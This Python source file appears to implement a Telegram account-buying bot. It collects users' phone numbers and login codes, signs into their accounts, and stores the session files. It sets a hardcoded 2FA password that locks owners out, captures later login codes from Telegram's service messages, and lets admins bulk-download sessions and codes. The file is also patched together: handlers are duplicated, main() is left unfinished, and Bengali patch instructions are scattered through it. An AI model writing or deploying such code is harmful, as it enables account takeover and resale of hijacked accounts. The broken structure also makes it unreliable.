import os
import json
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
WITHDRAW_CHANNEL = os.getenv("WITHDRAW_CHANNEL")
FORCE_CHANNEL = os.getenv("FORCE_CHANNEL")
REFERRAL_BONUS = float(os.getenv("REFERRAL_BONUS", 0.05))
INITIAL_ADMINS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
DEFAULT_PRICE = 0.30
DEFAULT_WAIT_HOURS = 18
MIN_WITHDRAW = 1.00

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

CODES_FILE = f"{DATA_DIR}/codes.json"
ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
BALANCES_FILE = f"{DATA_DIR}/balances.json"
CLAIMS_FILE = f"{DATA_DIR}/claims.json"
REFS_FILE = f"{DATA_DIR}/referrals.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"
SUPPORT_FILE = f"{DATA_DIR}/support.json"

# ====================== STATES ======================
WAITING_CODE, WD_METHOD, WD_DETAILS, SUPPORT_MSG = range(4)

# ====================== GLOBAL ======================
clients = {}
pending = {}

# ====================== HELPER FUNCTIONS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = INITIAL_ADMINS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_settings():
    s = load_json(SETTINGS_FILE, {})
    return {
        "price": s.get("price", DEFAULT_PRICE),
        "wait": s.get("wait", DEFAULT_WAIT_HOURS),
        "ref_bonus": s.get("ref_bonus", REFERRAL_BONUS)
    }

def save_settings(data):
    save_json(SETTINGS_FILE, data)

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧", "27": "🇿🇦",
        "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷", "7": "🇷🇺", "49": "🇩🇪",
        "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩", "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭",
        "55": "🇧🇷", "52": "🇲🇽", "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱"
    }
    p = phone.replace("+", "")
    for c in sorted(flags, key=len, reverse=True):
        if p.startswith(c):
            return flags[c]
    return "🏳️"

def add_balance(uid, amount):
    bal = load_json(BALANCES_FILE, {})
    bal[str(uid)] = round(bal.get(str(uid), 0) + amount, 2)
    save_json(BALANCES_FILE, bal)
    return bal[str(uid)]

async def check_joined(bot, user_id):
    if not FORCE_CHANNEL:
        return True
    try:
        member = await bot.get_chat_member(FORCE_CHANNEL, user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False
        # ====================== TELETHON FUNCTIONS ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {
                "code": m.group(1),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            codes[phone] = codes[phone][:12]
            save_json(CODES_FILE, codes)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False


async def enable_2fa(client, password):
    try:
        await client.edit_2fa(new_password=password)
        return True
    except:
        return False


# ====================== USER HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Force Join Check
    if FORCE_CHANNEL and not await check_joined(context.bot, user.id):
        kb = [[InlineKeyboardButton("✅ Join Channel", url=f"https://t.me/{str(FORCE_CHANNEL).replace('@', '')}")]]
        await update.message.reply_text(
            "⚠️ Please join our channel first to use the bot.",
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return

    # Referral
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref = int(context.args[0][4:])
            if ref != user.id:
                refs = load_json(REFS_FILE, {})
                if str(user.id) not in refs:
                    refs[str(user.id)] = ref
                    save_json(REFS_FILE, refs)
        except:
            pass

    link = f"https://t.me/{context.bot.username}?start=ref_{user.id}"
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\n\n"
        f"Send number with +\nExample: `+8801712345678`\n\n"
        f"🔗 Referral Link:\n`{link}`\n\n"
        f"/balance - Balance\n/withdraw - Withdraw\n/support - Support",
        parse_mode="Markdown"
    )


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = load_json(BALANCES_FILE, {}).get(str(update.effective_user.id), 0)
    await update.message.reply_text(f"💰 Balance: **${bal:.2f}**", parse_mode="Markdown")


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    wait_msg = await update.message.reply_text("⏳ Waiting for otp...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text("This number is already logged in!")
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        flag = get_flag(phone)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"Code sent! Reply with the 5 or 6-digit login code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Please wait {e.seconds} seconds.")
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")
        # ====================== HANDLE CODE + CLAIM ======================
async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        return

    data = pending[chat_id]
    code = update.message.text.strip()

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        await update.message.reply_text("This number already has 2FA. Skipped.")
        await data["client"].disconnect()
        del pending[chat_id]
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text(
            "❗️ The login code is invalid, Send the correct code.\n\n➿ /cancel"
        )
        return
    except Exception as e:
        await update.message.reply_text(f"Error: {e}\n\n/cancel")
        await data["client"].disconnect()
        del pending[chat_id]
        return

    # Login Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"], TWO_FA_PASSWORD)
    settings = get_settings()
    claim_id = f"{data['uid']}_{data['phone'][1:]}_{int(datetime.now().timestamp())}"

    # Save Account
    accs = load_json(ACCOUNTS_FILE, {})
    accs[data["phone"]] = {
        "uid": data["uid"],
        "name": me.first_name or "",
        "price": settings["price"],
        "wait": settings["wait"],
        "claim_id": claim_id
    }
    save_json(ACCOUNTS_FILE, accs)

    # Save Claim
    claims = load_json(CLAIMS_FILE, {})
    claims[claim_id] = {
        "uid": data["uid"],
        "phone": data["phone"],
        "price": settings["price"],
        "wait": settings["wait"],
        "time": datetime.now().isoformat(),
        "done": False
    }
    save_json(CLAIMS_FILE, claims)

    await data["client"].disconnect()
    await start_client(data["phone"])
    del pending[chat_id]

    flag = get_flag(data["phone"])
    kb = [[InlineKeyboardButton("💰 Claim Balance", callback_data=f"claim_{claim_id}")]]
    
    await update.message.reply_text(
        f"✅ **Account Received completed** {flag}\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"• Number: `{data['phone']}`\n"
        f"• Sell price: {settings['price']} USD ✓\n"
        f"• Country’s wait time: {settings['wait']} hrs ✓\n"
        f"• 2FA: {'Enabled ✅' if ok else 'Failed'}",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )


async def claim_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    cid = q.data.replace("claim_", "")
    claims = load_json(CLAIMS_FILE, {})
    
    if cid not in claims or claims[cid]["done"]:
        await q.edit_message_text("Already claimed")
        return
        
    c = claims[cid]
    if c["uid"] != q.from_user.id:
        await q.answer("Not yours", show_alert=True)
        return
        
    unlock = datetime.fromisoformat(c["time"]) + timedelta(hours=c["wait"])
    if datetime.now() < unlock:
        left = unlock - datetime.now()
        hours = int(left.total_seconds() // 3600)
        mins = int((left.total_seconds() % 3600) // 60)
        await q.answer(f"Wait {hours}h {mins}m more", show_alert=True)
        return
        
    newb = add_balance(c["uid"], c["price"])
    
    # Referral Bonus
    refs = load_json(REFS_FILE, {})
    if str(c["uid"]) in refs:
        add_balance(refs[str(c["uid"])], get_settings()["ref_bonus"])
        
    c["done"] = True
    claims[cid] = c
    save_json(CLAIMS_FILE, claims)
    
    await q.edit_message_text(f"✅ +${c['price']}\nBalance: ${newb:.2f}")


# ====================== SUPPORT SYSTEM ======================
async def support_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🧑🏻‍💻 Send your message.\n\n"
        "Type your problem or question now.\n"
        "❌ /cancel to cancel"
    )
    return SUPPORT_MSG


async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text

    tickets = load_json(SUPPORT_FILE, {})
    ticket_id = f"{user.id}_{int(datetime.now().timestamp())}"
    tickets[ticket_id] = {
        "user_id": user.id,
        "name": user.first_name,
        "username": user.username,
        "message": text,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    save_json(SUPPORT_FILE, tickets)

    # Notify Admins
    for admin_id in get_admins():
        try:
            kb = [[InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user.id}")]]
            await context.bot.send_message(
                admin_id,
                f"🆘 **New Support Message**\n\n"
                f"From: {user.first_name} (`{user.id}`)\n"
                f"Username: @{user.username or 'None'}\n\n"
                f"Message:\n{text}",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
        except:
            pass

    await update.message.reply_text("✅ Your message has been sent to support. Please wait.")
    return ConversationHandler.END


# ====================== WITHDRAW SYSTEM ======================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = load_json(BALANCES_FILE, {}).get(str(update.effective_user.id), 0)
    
    if bal < MIN_WITHDRAW:
        await update.message.reply_text(f"❌ Minimum withdraw is ${MIN_WITHDRAW}\nYour balance: ${bal:.2f}")
        return ConversationHandler.END
        
    kb = [
        [InlineKeyboardButton("💳 Leader Card", callback_data="wd_card")],
        [InlineKeyboardButton("🟡 Binance BEP20", callback_data="wd_bep")],
        [InlineKeyboardButton("❌ Cancel", callback_data="wd_cancel")]
    ]
    await update.message.reply_text(
        f"💰 Your Balance: **${bal:.2f}**\n\nSelect withdraw method:",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )
    return WD_METHOD


async def wd_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    if q.data == "wd_cancel":
        await q.edit_message_text("Withdraw cancelled.")
        return ConversationHandler.END
        
    context.user_data["method"] = "Leader Card" if q.data == "wd_card" else "Binance BEP20"
    await q.edit_message_text("Send your details now:\n(Example: Smartmethod or Binance UID)")
    return WD_DETAILS


async def wd_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    details = update.message.text
    method = context.user_data.get("method", "Unknown")
    bal = load_json(BALANCES_FILE, {}).get(str(user.id), 0)
    accs = sum(1 for a in load_json(ACCOUNTS_FILE, {}).values() if a.get("uid") == user.id)

    # Reset balance
    b = load_json(BALANCES_FILE, {})
    b[str(user.id)] = 0
    save_json(BALANCES_FILE, b)

    text = (
        f"💸 **New Withdrawal Request**\n\n"
        f"👤 **User Information**\n"
        f"▫️ Name: {user.first_name}\n"
        f"▫️ User ID: `{user.id}`\n"
        f"▫️ Username: @{user.username or 'None'}\n\n"
        f"📊 **Account Summary**\n"
        f"▫️ Total Accounts: {accs}\n"
        f"💵 Balance: ${bal:.2f}\n\n"
        f"🔄 **Withdrawal Details**\n"
        f"▫️ Method: {method}\n"
        f"▫️ Details: {details}\n"
        f"⏰ Time: {datetime.now().strftime('%H:%M:%S - %Y/%m/%d')}"
    )

    if WITHDRAW_CHANNEL:
        try:
            await context.bot.send_message(
                chat_id=int(WITHDRAW_CHANNEL),
                text=text,
                parse_mode="Markdown"
            )
        except Exception as e:
            print("Channel Error:", e)

    await update.message.reply_text("✅ Withdrawal request submitted successfully!")
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled. You can send a new number.")
    return ConversationHandler.END
    # ====================== ADMIN DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    s = get_settings()
    accs = len(load_json(ACCOUNTS_FILE, {}))
    total_bal = sum(load_json(BALANCES_FILE, {}).values())
    admins = get_admins()

    text = (
        f"📊 **Admin Dashboard**\n\n"
        f"• Total Accounts: `{accs}`\n"
        f"• Online Clients: `{len(clients)}`\n"
        f"• Total User Balance: `${total_bal:.2f}`\n"
        f"• Current Price: `${s['price']}`\n"
        f"• Wait Time: `{s['wait']} hours`\n"
        f"• Referral Bonus: `${s['ref_bonus']}`\n"
        f"• Total Admins: `{len(admins)}`\n\n"
        f"Select an option below:"
    )

    kb = [
        [
            InlineKeyboardButton("💰 Set Price", callback_data="set_price"),
            InlineKeyboardButton("⏱ Set Wait Time", callback_data="set_wait")
        ],
        [
            InlineKeyboardButton("🎁 Set Referral Bonus", callback_data="set_ref")
        ],
        [
            InlineKeyboardButton("➕ Add Admin", callback_data="add_admin"),
            InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")
        ],
        [
            InlineKeyboardButton("📥 Download Codes", callback_data="dl_codes"),
            InlineKeyboardButton("📁 Download Sessions", callback_data="dl_sess")
        ],
        [
            InlineKeyboardButton("📋 List Accounts", callback_data="list_acc"),
            InlineKeyboardButton("👑 Admin List", callback_data="list_admins")
        ],
        [
            InlineKeyboardButton("🔄 Reload Clients", callback_data="reload_clients")
        ]
    ]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")


async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if not is_admin(q.from_user.id):
        return

    data = q.data

    if data == "set_price":
        context.user_data["edit"] = "price"
        await q.edit_message_text("💰 Send new **price**:\n\nExample: `0.35`", parse_mode="Markdown")

    elif data == "set_wait":
        context.user_data["edit"] = "wait"
        await q.edit_message_text("⏱ Send **wait time** in hours:\n\nExample: `18`", parse_mode="Markdown")

    elif data == "set_ref":
        context.user_data["edit"] = "ref"
        await q.edit_message_text("🎁 Send **referral bonus**:\n\nExample: `0.05`", parse_mode="Markdown")

    elif data == "add_admin":
        context.user_data["edit"] = "add_admin"
        await q.edit_message_text("➕ Send the **Telegram User ID** of new admin:")

    elif data == "remove_admin":
        admins = get_admins()
        if len(admins) <= 1:
            await q.answer("⚠️ Cannot remove the last admin!", show_alert=True)
            return

        kb = []
        for aid in admins:
            if aid != q.from_user.id:
                kb.append([InlineKeyboardButton(f"🗑 Remove {aid}", callback_data=f"rmadmin_{aid}")])
        kb.append([InlineKeyboardButton("« Back to Dashboard", callback_data="back_dash")])
        await q.edit_message_text("Select admin to remove:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("rmadmin_"):
        aid = int(data.replace("rmadmin_", ""))
        admins = get_admins()
        if aid in admins and len(admins) > 1:
            admins.remove(aid)
            save_json(ADMINS_FILE, admins)
            await q.edit_message_text(f"✅ Admin removed successfully!\n\nRemoved ID: `{aid}`", parse_mode="Markdown")
        else:
            await q.edit_message_text("❌ Failed to remove admin.")

    elif data.startswith("reply_"):
        uid = int(data.replace("reply_", ""))
        context.user_data["reply_to"] = uid
        await q.edit_message_text(f"✍️ Send reply message for user `{uid}`:", parse_mode="Markdown")

    elif data == "dl_codes":
        path = f"{DATA_DIR}/codes.json"
        save_json(path, load_json(CODES_FILE, {}))
        await q.message.reply_document(document=open(path, "rb"), filename="codes.json", caption="📥 All Codes")

    elif data == "dl_sess":
        import zipfile
        zpath = f"{DATA_DIR}/sessions.zip"
        with zipfile.ZipFile(zpath, "w") as z:
            for f in os.listdir(SESSIONS_DIR):
                if f.endswith(".session"):
                    z.write(f"{SESSIONS_DIR}/{f}", f)
        await q.message.reply_document(document=open(zpath, "rb"), filename="all_sessions.zip", caption="📁 All Sessions")

    elif data == "list_acc":
        accs = load_json(ACCOUNTS_FILE, {})
        if not accs:
            await q.edit_message_text("📭 No accounts found.")
            return
        text = f"📋 **Total Accounts: {len(accs)}**\n\n"
        for i, phone in enumerate(list(accs.keys())[:40], 1):
            text += f"`{i}.` `{phone}`\n"
        if len(accs) > 40:
            text += f"\n... and **{len(accs)-40}** more"
        await q.edit_message_text(text, parse_mode="Markdown")

    elif data == "list_admins":
        admins = get_admins()
        text = "👑 **Current Admins:**\n\n" + "\n".join([f"• `{a}`" for a in admins])
        await q.edit_message_text(text, parse_mode="Markdown")

    elif data == "reload_clients":
        await q.edit_message_text("🔄 Reloading all clients...")
        count = 0
        for phone in load_json(ACCOUNTS_FILE, {}):
            try:
                await start_client(phone)
                count += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded **{count}** clients successfully!")

    elif data == "back_dash":
        # Full dashboard again
        s = get_settings()
        accs = len(load_json(ACCOUNTS_FILE, {}))
        total_bal = sum(load_json(BALANCES_FILE, {}).values())
        admins = get_admins()

        text = (
            f"📊 **Admin Dashboard**\n\n"
            f"• Total Accounts: `{accs}`\n"
            f"• Online Clients: `{len(clients)}`\n"
            f"• Total User Balance: `${total_bal:.2f}`\n"
            f"• Current Price: `${s['price']}`\n"
            f"• Wait Time: `{s['wait']} hours`\n"
            f"• Referral Bonus: `${s['ref_bonus']}`\n"
            f"• Total Admins: `{len(admins)}`"
        )
        kb = [
            [InlineKeyboardButton("💰 Set Price", callback_data="set_price"),
             InlineKeyboardButton("⏱ Set Wait Time", callback_data="set_wait")],
            [InlineKeyboardButton("🎁 Set Referral Bonus", callback_data="set_ref")],
            [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin"),
             InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
            [InlineKeyboardButton("📥 Download Codes", callback_data="dl_codes"),
             InlineKeyboardButton("📁 Download Sessions", callback_data="dl_sess")],
            [InlineKeyboardButton("📋 List Accounts", callback_data="list_acc"),
             InlineKeyboardButton("👑 Admin List", callback_data="list_admins")],
            [InlineKeyboardButton("🔄 Reload Clients", callback_data="reload_clients")]
        ]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")


async def admin_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    # Support Reply
    if "reply_to" in context.user_data:
        uid = context.user_data.pop("reply_to")
        try:
            await context.bot.send_message(
                uid,
                f"📩 **Support Reply:**\n\n{update.message.text}",
                parse_mode="Markdown"
            )
            await update.message.reply_text("✅ Reply sent successfully!")
        except:
            await update.message.reply_text("❌ Failed to send reply. User may have blocked the bot.")
        return

    if "edit" not in context.user_data:
        return

    key = context.user_data.pop("edit")
    text = update.message.text.strip()

    try:
        if key == "add_admin":
            new_id = int(text)
            admins = get_admins()
            if new_id not in admins:
                admins.append(new_id)
                save_json(ADMINS_FILE, admins)
                await update.message.reply_text(f"✅ New admin added successfully!\n\nID: `{new_id}`", parse_mode="Markdown")
            else:
                await update.message.reply_text("⚠️ This user is already an admin.")
        else:
            val = float(text) if key != "wait" else int(text)
            s = get_settings()
            if key == "price":
                s["price"] = val
            elif key == "wait":
                s["wait"] = val
            elif key == "ref":
                s["ref_bonus"] = val
            save_settings(s)
            await update.message.reply_text(f"✅ **{key}** updated to `{val}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid value.\nError: {e}")


# ====================== POST INIT & MAIN ======================
async def post_init(app: Application):
    print("🔄 Loading saved sessions...")
    accounts = load_json(ACCOUNTS_FILE, {})
    loaded = 0
    for phone in accounts:
        try:
            success = await start_client(phone)
            if success:
                loaded += 1
                print(f"✅ Loaded: {phone}")
        except Exception as e:
            print(f"❌ Error loading {phone}: {e}")
    print(f"✅ Bot Ready! Loaded {loaded} sessions.")


def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Conversations
    login_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)
        ],
        states={
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    wd_conv = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw)],
        states={
            WD_METHOD: [CallbackQueryHandler(wd_method)],
            WD_DETAILS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, wd_details)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    support_conv = ConversationHandler(
        entry_points=[CommandHandler("support", support_start)],
        states={
            SUPPORT_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    # ====================== LANGUAGE + CAPACITY ======================

LANG_FILE = f"{DATA_DIR}/user_lang.json"
CAPACITY_FILE = f"{DATA_DIR}/capacity.json"

def get_user_lang(uid):
    langs = load_json(LANG_FILE, {})
    return langs.get(str(uid), "en")

def set_user_lang(uid, lang):
    langs = load_json(LANG_FILE, {})
    langs[str(uid)] = lang
    save_json(LANG_FILE, langs)

def t(uid, en_text, bn_text):
    """Simple translation helper"""
    if get_user_lang(uid) == "bn":
        return bn_text
    return en_text

def get_capacity(country_code):
    caps = load_json(CAPACITY_FILE, {})
    return caps.get(str(country_code), 9999)  # default unlimited

def set_capacity(country_code, limit):
    caps = load_json(CAPACITY_FILE, {})
    caps[str(country_code)] = int(limit)
    save_json(CAPACITY_FILE, caps)

def get_country_code(phone):
    phone = phone.replace("+", "")
    # Try 3 digit first, then 2 digit, then 1 digit
    for length in [3, 2, 1]:
        code = phone[:length]
        if code.isdigit():
            return code
    return phone[:2]


# ====================== LANGUAGE COMMAND ======================
async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
    ]
    await update.message.reply_text(
        "🌐 Select Language / ভাষা নির্বাচন করুন:",
        reply_markup=InlineKeyboardMarkup(kb)
    )


# ====================== UPDATE handle_phone FOR CAPACITY ======================
# (এই ফাংশনটা আগের handle_phone এর জায়গায় বসাবে অথবা এর ভিতরে Capacity চেকটা যোগ করবে)

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    # ===== Capacity Check =====
    country_code = get_country_code(phone)
    limit = get_capacity(country_code)

    accs = load_json(ACCOUNTS_FILE, {})
    current_count = sum(1 for p in accs if p.startswith(f"+{country_code}"))

    if current_count >= limit:
        await update.message.reply_text(
            f"❌ Capacity full for this country!\n\n"
            f"Country Code: `{country_code}`\n"
            f"Current: `{current_count}` / Limit: `{limit}`",
            parse_mode="Markdown"
        )
        return

    # ===== Normal Process =====
    wait_msg = await update.message.reply_text("⏳ Waiting for otp...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text("This number is already logged in!")
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        flag = get_flag(phone)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"Code sent! Reply with the 5 or 6-digit login code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Please wait {e.seconds} seconds.")
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")


# ====================== UPDATE admin_cb (Capacity বাটন যোগ) ======================
# admin_cb ফাংশনের ভিতরে এই অংশগুলো যোগ করবে:

"""
    elif data == "set_capacity":
        context.user_data["edit"] = "capacity"
        await q.edit_message_text(
            "📊 Send country code and limit\n\n"
            "Example:\n`880 150`\n`91 200`\n`1 50`",
            parse_mode="Markdown"
        )

    elif data.startswith("lang_"):
        lang = data.replace("lang_", "")
        set_user_lang(q.from_user.id, lang)
        msg = "✅ Language changed to English" if lang == "en" else "✅ ভাষা বাংলা করা হয়েছে"
        await q.edit_message_text(msg)
"""


# ====================== UPDATE admin_edit (Capacity হ্যান্ডেল) ======================
# admin_edit ফাংশনের ভিতরে এই অংশ যোগ করবে:

"""
        if key == "capacity":
            parts = text.split()
            if len(parts) == 2:
                code = parts[0]
                limit = int(parts[1])
                set_capacity(code, limit)
                await update.message.reply_text(
                    f"✅ Capacity updated!\n\nCountry: `{code}`\nLimit: `{limit}`",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Wrong format.\nUse: `880 150`", parse_mode="Markdown")
            return
"""


# ====================== DASHBOARD এ Capacity বাটন যোগ করো ======================
# dashboard ফাংশনের kb তে এই বাটনটা যোগ করো:

"""
        [
            InlineKeyboardButton("📊 Set Capacity", callback_data="set_capacity")
        ],
"""


# ====================== MAIN এ Language কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনটা যোগ করো:

"""
    app.add_handler(CommandHandler("language", language_cmd))
"""
# ====================== USER SESSION DOWNLOAD + FROZEN LIST ======================

FROZEN_FILE = f"{DATA_DIR}/frozen.json"

def get_frozen():
    return load_json(FROZEN_FILE, {})

def add_frozen(phone, reason="Frozen"):
    frozen = get_frozen()
    frozen[phone] = {
        "reason": reason,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    save_json(FROZEN_FILE, frozen)

def remove_frozen(phone):
    frozen = get_frozen()
    if phone in frozen:
        del frozen[phone]
        save_json(FROZEN_FILE, frozen)

def is_frozen(phone):
    return phone in get_frozen()


# ====================== ADMIN: Download specific user sessions ======================
async def download_user_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: /dsession <user_id>"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage:\n`/dsession 123456789`", parse_mode="Markdown")
        return

    try:
        target_uid = int(context.args[0])
    except:
        await update.message.reply_text("Invalid User ID")
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    user_phones = [phone for phone, info in accounts.items() if info.get("uid") == target_uid]

    if not user_phones:
        await update.message.reply_text("This user has no accounts.")
        return

    import zipfile
    zip_path = f"{DATA_DIR}/user_{target_uid}_sessions.zip"

    with zipfile.ZipFile(zip_path, "w") as zf:
        for phone in user_phones:
            session_file = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
            if os.path.exists(session_file):
                zf.write(session_file, f"{phone.replace('+','')}.session")

    await update.message.reply_document(
        document=open(zip_path, "rb"),
        filename=f"user_{target_uid}_sessions.zip",
        caption=f"📁 Sessions of User: `{target_uid}`\nTotal: {len(user_phones)} accounts"
    )


# ====================== FROZEN COMMANDS ======================
async def freeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage:\n`/freeze +8801712345678`", parse_mode="Markdown")
        return

    phone = context.args[0]
    if not phone.startswith("+"):
        phone = "+" + phone

    add_frozen(phone, "Marked as frozen by admin")
    await update.message.reply_text(f"❄️ Account frozen:\n`{phone}`", parse_mode="Markdown")


async def unfreeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage:\n`/unfreeze +8801712345678`", parse_mode="Markdown")
        return

    phone = context.args[0]
    if not phone.startswith("+"):
        phone = "+" + phone

    remove_frozen(phone)
    await update.message.reply_text(f"✅ Unfrozen:\n`{phone}`", parse_mode="Markdown")


